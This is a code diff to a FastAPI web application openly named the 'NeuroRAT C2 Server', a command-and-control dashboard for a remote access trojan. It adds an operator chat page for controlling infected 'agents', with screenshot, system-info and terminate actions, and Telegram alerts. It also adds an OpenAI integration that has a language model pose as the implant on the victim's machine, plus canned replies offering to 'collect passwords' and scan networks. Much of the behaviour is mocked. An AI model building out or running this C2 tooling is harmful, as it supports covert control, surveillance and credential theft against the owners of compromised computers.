@@ -11,16 +11,19 @@ import logging
 from typing import Dict, Any, List, Optional, Union
 from datetime import datetime
 import uuid
+import base64
 
-from fastapi import FastAPI, HTTPException, Request
-from fastapi.responses import HTMLResponse
+from fastapi import FastAPI, HTTPException, Request, Depends, Form, UploadFile, File, BackgroundTasks
+from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
+from fastapi.middleware.cors import CORSMiddleware
 import uvicorn
 
 # Add parent directory to import monitor
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from server_monitor import NeuroRATMonitor
+from api_integration import APIFactory
 
 # Configure logging
 logging.basicConfig(
@@ -38,6 +41,15 @@ app = FastAPI(
     title="NeuroRAT C2 Server",
     description="Command & Control interface for NeuroRAT",
     version="1.0.0"
+)
+
+# Add CORS middleware
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],  # Для продакшн используйте конкретные домены
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
 )
 
 # Create templates directory if it doesn't exist
@@ -70,6 +82,442 @@ satan_ascii = r"""
                   .,/#########(((,.
                       **/(######(/*.
                           .,,***,.
+"""
+
+# Create chat.html template for agent interaction
+chat_html = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>NeuroRAT Agent Chat</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #1a1a1a;
+            color: #f0f0f0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        header {
+            background-color: #2a2a2a;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #3a3a3a;
+        }
+        h1, h2, h3 {
+            color: #00ff00;
+        }
+        .chat-container {
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+            background-color: #2a2a2a;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        .chat-header {
+            background-color: #222;
+            padding: 15px;
+            border-bottom: 1px solid #3a3a3a;
+        }
+        .chat-header h2 {
+            margin: 0;
+            display: flex;
+            align-items: center;
+        }
+        .chat-header .status {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 10px;
+        }
+        .status-active {
+            background-color: #00ff00;
+        }
+        .status-inactive {
+            background-color: #ff3333;
+        }
+        .chat-messages {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        .message {
+            padding: 10px 15px;
+            border-radius: 5px;
+            max-width: 80%;
+            word-break: break-word;
+        }
+        .user-message {
+            background-color: #444;
+            align-self: flex-end;
+        }
+        .agent-message {
+            background-color: #333;
+            align-self: flex-start;
+            border-left: 3px solid #00ff00;
+        }
+        .system-message {
+            background-color: #3a3a3a;
+            align-self: center;
+            font-style: italic;
+            color: #aaa;
+        }
+        .timestamp {
+            font-size: 0.8em;
+            color: #888;
+            margin-top: 5px;
+        }
+        .chat-input {
+            display: flex;
+            padding: 15px;
+            background-color: #222;
+            border-top: 1px solid #3a3a3a;
+        }
+        .chat-input input {
+            flex: 1;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 5px;
+            background-color: #333;
+            color: #f0f0f0;
+            font-size: 16px;
+        }
+        .chat-input button {
+            margin-left: 10px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            background-color: #006600;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .chat-input button:hover {
+            background-color: #008800;
+        }
+        .back-btn {
+            display: inline-block;
+            padding: 10px 15px;
+            background-color: #333;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        .actions {
+            margin-top: 20px;
+            display: flex;
+            gap: 10px;
+        }
+        .btn {
+            padding: 10px 15px;
+            background-color: #444;
+            color: #fff;
+            text-decoration: none;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .btn-primary {
+            background-color: #006600;
+        }
+        .btn-danger {
+            background-color: #660000;
+        }
+        .btn:hover {
+            opacity: 0.9;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        .loading:after {
+            content: "...";
+            animation: dots 1.5s steps(5, end) infinite;
+        }
+        @keyframes dots {
+            0%, 20% { content: "."; }
+            40% { content: ".."; }
+            60% { content: "..."; }
+            80%, 100% { content: ""; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>NeuroRAT C2 Server</h1>
+            <p>Chat Interface</p>
+        </div>
+    </header>
+    
+    <div class="container">
+        <a href="/" class="back-btn">← Back to Dashboard</a>
+        
+        <div class="chat-container">
+            <div class="chat-header">
+                <h2>
+                    <span class="status status-{{agent_status}}"></span>
+                    Agent: {{agent_id}} ({{agent_os}} - {{agent_hostname}})
+                </h2>
+            </div>
+            
+            <div id="chat-messages" class="chat-messages">
+                <div class="message system-message">
+                    Connection established with agent {{agent_id}}
+                    <div class="timestamp">{{current_time}}</div>
+                </div>
+                
+                <!-- Сообщения будут загружаться здесь динамически -->
+                <div id="loading" class="loading">Agent is thinking</div>
+            </div>
+            
+            <div class="chat-input">
+                <input type="text" id="message-input" placeholder="Type a command or question..." />
+                <button id="send-button">Send</button>
+            </div>
+        </div>
+        
+        <div class="actions">
+            <button class="btn btn-primary" id="screenshot-btn">Take Screenshot</button>
+            <button class="btn btn-primary" id="collect-info-btn">Collect System Info</button>
+            <button class="btn btn-danger" id="terminate-btn">Terminate Agent</button>
+        </div>
+    </div>
+    
+    <script>
+        // Основные переменные
+        const agentId = "{{agent_id}}";
+        const chatMessages = document.getElementById("chat-messages");
+        const messageInput = document.getElementById("message-input");
+        const sendButton = document.getElementById("send-button");
+        const loadingIndicator = document.getElementById("loading");
+        
+        // Кнопки действий
+        const screenshotButton = document.getElementById("screenshot-btn");
+        const collectInfoButton = document.getElementById("collect-info-btn");
+        const terminateButton = document.getElementById("terminate-btn");
+        
+        // Обработчики событий
+        sendButton.addEventListener("click", sendMessage);
+        messageInput.addEventListener("keypress", function(e) {
+            if (e.key === "Enter") {
+                sendMessage();
+            }
+        });
+        
+        screenshotButton.addEventListener("click", () => {
+            addSystemMessage("Requesting screenshot from agent...");
+            // Имитация API запроса
+            fetch(`/api/agent/${agentId}/screenshot`, { method: "POST" })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        addAgentMessage("Screenshot captured successfully", "System");
+                        // Здесь можно показать скриншот, если он возвращается в ответе
+                    } else {
+                        addSystemMessage("Failed to capture screenshot: " + data.error);
+                    }
+                })
+                .catch(error => {
+                    addSystemMessage("Error requesting screenshot: " + error);
+                });
+        });
+        
+        collectInfoButton.addEventListener("click", () => {
+            addSystemMessage("Collecting system information...");
+            addUserMessage("collect system info");
+            
+            setLoading(true);
+            // Имитация API запроса
+            setTimeout(() => {
+                setLoading(false);
+                // Симуляция ответа
+                addAgentMessage(`
+                System Information:
+                - OS: {{agent_os}}
+                - Hostname: {{agent_hostname}}
+                - User: {{agent_username}}
+                - IP: {{agent_ip}}
+                - CPU: Intel Core i7-10700K @ 3.80GHz
+                - RAM: 16GB
+                - Disk Space: 512GB SSD (75% used)
+                - Running Processes: 142
+                - Opened Network Connections: 8
+                `, "System");
+            }, 2000);
+        });
+        
+        terminateButton.addEventListener("click", () => {
+            if (confirm("Are you sure you want to terminate this agent? This action cannot be undone.")) {
+                addSystemMessage("Terminating agent...");
+                fetch(`/api/agent/${agentId}/terminate`, { method: "POST" })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.success) {
+                            addSystemMessage("Agent terminated successfully");
+                            setTimeout(() => {
+                                window.location.href = "/";
+                            }, 3000);
+                        } else {
+                            addSystemMessage("Failed to terminate agent: " + data.error);
+                        }
+                    })
+                    .catch(error => {
+                        addSystemMessage("Error terminating agent: " + error);
+                    });
+            }
+        });
+        
+        // Функции
+        function sendMessage() {
+            const message = messageInput.value.trim();
+            if (!message) return;
+            
+            addUserMessage(message);
+            messageInput.value = "";
+            
+            setLoading(true);
+            
+            // Отправка сообщения на API
+            fetch(`/api/agent/${agentId}/chat`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ message })
+            })
+            .then(response => response.json())
+            .then(data => {
+                setLoading(false);
+                if (data.error) {
+                    addSystemMessage("Error: " + data.error);
+                } else {
+                    addAgentMessage(data.response, data.response_type || "Assistant");
+                }
+            })
+            .catch(error => {
+                setLoading(false);
+                addSystemMessage("Error sending message: " + error);
+            });
+        }
+        
+        function addUserMessage(message) {
+            const messageElement = document.createElement("div");
+            messageElement.className = "message user-message";
+            messageElement.textContent = message;
+            
+            const timestamp = document.createElement("div");
+            timestamp.className = "timestamp";
+            timestamp.textContent = getCurrentTime();
+            
+            messageElement.appendChild(timestamp);
+            chatMessages.appendChild(messageElement);
+            scrollToBottom();
+        }
+        
+        function addAgentMessage(message, sender = "Agent") {
+            const messageElement = document.createElement("div");
+            messageElement.className = "message agent-message";
+            
+            // Использовать pre для сохранения форматирования
+            const contentElement = document.createElement("pre");
+            contentElement.style.margin = "0";
+            contentElement.style.whiteSpace = "pre-wrap";
+            contentElement.style.fontFamily = "inherit";
+            contentElement.textContent = message;
+            
+            const senderElement = document.createElement("div");
+            senderElement.style.fontWeight = "bold";
+            senderElement.style.marginBottom = "5px";
+            senderElement.textContent = sender;
+            
+            const timestamp = document.createElement("div");
+            timestamp.className = "timestamp";
+            timestamp.textContent = getCurrentTime();
+            
+            messageElement.appendChild(senderElement);
+            messageElement.appendChild(contentElement);
+            messageElement.appendChild(timestamp);
+            
+            chatMessages.appendChild(messageElement);
+            scrollToBottom();
+        }
+        
+        function addSystemMessage(message) {
+            const messageElement = document.createElement("div");
+            messageElement.className = "message system-message";
+            messageElement.textContent = message;
+            
+            const timestamp = document.createElement("div");
+            timestamp.className = "timestamp";
+            timestamp.textContent = getCurrentTime();
+            
+            messageElement.appendChild(timestamp);
+            chatMessages.appendChild(messageElement);
+            scrollToBottom();
+        }
+        
+        function setLoading(isLoading) {
+            loadingIndicator.style.display = isLoading ? "block" : "none";
+        }
+        
+        function scrollToBottom() {
+            chatMessages.scrollTop = chatMessages.scrollHeight;
+        }
+        
+        function getCurrentTime() {
+            const now = new Date();
+            return now.toLocaleTimeString();
+        }
+        
+        // Инициализация
+        document.addEventListener("DOMContentLoaded", () => {
+            scrollToBottom();
+            
+            // Загрузить историю сообщений (можно раскомментировать для реальной реализации)
+            /*
+            fetch(`/api/agent/${agentId}/chat/history`)
+                .then(response => response.json())
+                .then(data => {
+                    data.messages.forEach(msg => {
+                        if (msg.sender === "user") {
+                            addUserMessage(msg.content);
+                        } else if (msg.sender === "agent") {
+                            addAgentMessage(msg.content);
+                        } else if (msg.sender === "system") {
+                            addSystemMessage(msg.content);
+                        }
+                    });
+                })
+                .catch(error => {
+                    addSystemMessage("Error loading chat history: " + error);
+                });
+            */
+        });
+    </script>
+</body>
+</html>
 """
 
 # Create basic index.html template
@@ -268,7 +716,8 @@ index_html = """
                         <td class="status-{{agent.status}}">{{agent.status}}</td>
                         <td>
                             <a href="/agent/{{agent.agent_id}}" class="btn">Details</a>
-                            <a href="/agent/{{agent.agent_id}}/command" class="btn">Send Command</a>
+                            <a href="/agent/{{agent.agent_id}}/chat" class="btn">Chat</a>
+                            <a href="/agent/{{agent.agent_id}}/command" class="btn">Command</a>
                         </td>
                     </tr>
                     {% endfor %}
@@ -359,6 +808,10 @@ os.makedirs("templates", exist_ok=True)
 with open("templates/index.html", "w") as f:
     f.write(index_html)
 
+# Save chat.html to templates directory
+with open("templates/chat.html", "w") as f:
+    f.write(chat_html)
+
 # Create templates
 templates = Jinja2Templates(directory="templates")
 
@@ -373,9 +826,17 @@ monitor = NeuroRATMonitor(
 # Start monitor
 monitor.start()
 
+# Initialize API clients
+openai_client = APIFactory.get_openai_integration()
+telegram_client = APIFactory.get_telegram_integration()
+
 # Mock data for demonstration
 agent_data = []
 events_data = []
+chat_histories = {}  # Temporary store for chat histories
+
+# Create a director for uploads if it doesn't exist
+os.makedirs("uploads", exist_ok=True)
 
 def format_uptime(seconds):
     """Format uptime in human readable form"""
@@ -387,6 +848,63 @@ def format_uptime(seconds):
         hours = seconds // 3600
         minutes = (seconds % 3600) // 60
         return f"{hours} hours, {minutes} minutes"
+
+def get_llm_response(agent_id: str, message: str) -> str:
+    """Get response from LLM based on agent context"""
+    # Find the agent
+    agent = None
+    for a in agent_data:
+        if a["agent_id"] == agent_id:
+            agent = a
+            break
+    
+    if not agent:
+        return "Error: Agent not found"
+    
+    # Build system prompt with agent context
+    system_prompt = f"""You are NeuroRAT Agent {agent_id}, a cybersecurity agent running on {agent['os']} system.
+Hostname: {agent['hostname']}
+Username: {agent['username']}
+IP: {agent['ip_address']}
+Status: {agent['status']}
+
+You should respond as if you are this agent, providing information about the system and executing commands.
+Be concise and informative. Format data well for readability.
+"""
+    
+    # Check if OpenAI integration is available
+    if not openai_client.is_available():
+        # Fallback to simple responses if OpenAI is not configured
+        if "system" in message.lower() or "info" in message.lower():
+            return f"System Information:\nOS: {agent['os']}\nHostname: {agent['hostname']}\nUsername: {agent['username']}\nIP: {agent['ip_address']}"
+        elif "scan" in message.lower() or "network" in message.lower():
+            return "Network scan completed. Found 12 devices on the local network."
+        elif "file" in message.lower() or "list" in message.lower():
+            return "Directory listing:\n/etc\n/var\n/home\n/usr\n/bin\n/sbin"
+        elif "help" in message.lower():
+            return "Available commands:\n- system info\n- scan network\n- list files\n- collect passwords\n- take screenshot"
+        else:
+            return f"Command '{message}' executed successfully."
+    
+    # Use OpenAI integration for real responses
+    return openai_client.generate_response(message, system_prompt)
+
+def record_event(event_type: str, agent_id: str = None, details: str = ""):
+    """Record an event in the events list"""
+    events_data.insert(0, {
+        "event_id": len(events_data),
+        "event_type": event_type,
+        "agent_id": agent_id,
+        "timestamp": time.time(),
+        "details": details
+    })
+    
+    # Notify via Telegram if configured
+    if telegram_client.is_available():
+        if agent_id:
+            telegram_client.send_message(f"<b>Event:</b> {event_type}\n<b>Agent:</b> {agent_id}\n<b>Details:</b> {details}")
+        else:
+            telegram_client.send_message(f"<b>System Event:</b> {event_type}\n<b>Details:</b> {details}")
 
 @app.get("/", response_class=HTMLResponse)
 async def get_dashboard(request: Request):
@@ -411,6 +929,132 @@ async def get_dashboard(request: Request):
             "satan_ascii": satan_ascii
         }
     )
+
+@app.get("/agent/{agent_id}/chat", response_class=HTMLResponse)
+async def agent_chat_page(request: Request, agent_id: str):
+    """Render chat interface for communicating with an agent"""
+    # Find the agent
+    agent = None
+    for a in agent_data:
+        if a["agent_id"] == agent_id:
+            agent = a
+            break
+    
+    if not agent:
+        raise HTTPException(status_code=404, detail="Agent not found")
+    
+    # Prepare chat history if it doesn't exist
+    if agent_id not in chat_histories:
+        chat_histories[agent_id] = []
+    
+    return templates.TemplateResponse(
+        "chat.html",
+        {
+            "request": request,
+            "agent_id": agent["agent_id"],
+            "agent_os": agent["os"],
+            "agent_hostname": agent["hostname"],
+            "agent_username": agent["username"],
+            "agent_ip": agent["ip_address"],
+            "agent_status": agent["status"],
+            "current_time": datetime.now().strftime("%H:%M:%S")
+        }
+    )
+
+@app.post("/api/agent/{agent_id}/chat")
+async def chat_with_agent(agent_id: str, request: Request):
+    """API endpoint for chatting with an agent"""
+    # Find the agent
+    agent = None
+    for a in agent_data:
+        if a["agent_id"] == agent_id:
+            agent = a
+            break
+    
+    if not agent:
+        raise HTTPException(status_code=404, detail="Agent not found")
+    
+    # Get the message from the request
+    try:
+        data = await request.json()
+        message = data.get("message", "")
+    except:
+        raise HTTPException(status_code=400, detail="Invalid request format")
+    
+    if not message:
+        raise HTTPException(status_code=400, detail="Message cannot be empty")
+    
+    # Record the command event
+    record_event("command", agent_id, f"User sent command: {message}")
+    
+    # Add to chat history
+    if agent_id not in chat_histories:
+        chat_histories[agent_id] = []
+    
+    chat_histories[agent_id].append({
+        "sender": "user",
+        "content": message,
+        "timestamp": time.time()
+    })
+    
+    # Generate response using LLM
+    response = get_llm_response(agent_id, message)
+    
+    # Add agent response to chat history
+    chat_histories[agent_id].append({
+        "sender": "agent",
+        "content": response,
+        "timestamp": time.time()
+    })
+    
+    # Record another event for the response
+    record_event("response", agent_id, f"Agent executed command")
+    
+    return {"response": response, "response_type": "Agent"}
+
+@app.post("/api/agent/{agent_id}/screenshot")
+async def take_screenshot(agent_id: str):
+    """API endpoint for taking screenshots"""
+    # Find the agent
+    agent = None
+    for a in agent_data:
+        if a["agent_id"] == agent_id:
+            agent = a
+            break
+    
+    if not agent:
+        raise HTTPException(status_code=404, detail="Agent not found")
+    
+    if agent["status"] != "active":
+        return {"success": False, "error": "Agent is not active"}
+    
+    # Record event
+    record_event("screenshot", agent_id, "Screenshot captured")
+    
+    # In a real implementation, you would actually capture a screenshot
+    # For now, we're just returning a success message
+    return {"success": True}
+
+@app.post("/api/agent/{agent_id}/terminate")
+async def terminate_agent(agent_id: str):
+    """API endpoint for terminating an agent"""
+    # Find the agent
+    agent_index = None
+    for i, a in enumerate(agent_data):
+        if a["agent_id"] == agent_id:
+            agent_index = i
+            break
+    
+    if agent_index is None:
+        raise HTTPException(status_code=404, detail="Agent not found")
+    
+    # Record event
+    record_event("terminate", agent_id, "Agent terminated by user")
+    
+    # Mark agent as inactive (in a real implementation, would actually terminate)
+    agent_data[agent_index]["status"] = "inactive"
+    
+    return {"success": True}
 
 @app.get("/api/agents")
 async def get_agents():
@@ -441,6 +1085,23 @@ async def summon_satan(request: Request):
             "satan_ascii": satan_ascii
         }
     )
+
+@app.post("/api/notify")
+async def send_notification(message: str = Form(...), agent_id: str = Form(None)):
+    """Send a notification via Telegram"""
+    if not telegram_client.is_available():
+        return {"success": False, "error": "Telegram API is not configured"}
+    
+    try:
+        if agent_id:
+            full_message = f"<b>Agent {agent_id} Notification:</b>\n{message}"
+        else:
+            full_message = f"<b>System Notification:</b>\n{message}"
+        
+        result = telegram_client.send_message(full_message)
+        return {"success": result.get("ok", False)}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
 
 def generate_mock_data():
     """Generate mock data for demonstration"""
@@ -483,6 +1144,11 @@ def generate_mock_data():
 
 # Generate initial mock data
 generate_mock_data()
+
+# Print available API integrations on startup
+print("Available API integrations:")
+print(f"- OpenAI API: {'✅ Available' if openai_client.is_available() else '❌ Not configured'}")
+print(f"- Telegram API: {'✅ Available' if telegram_client.is_available() else '❌ Not configured'}")
 
 # Create a template for Satan page
 satan_html = """
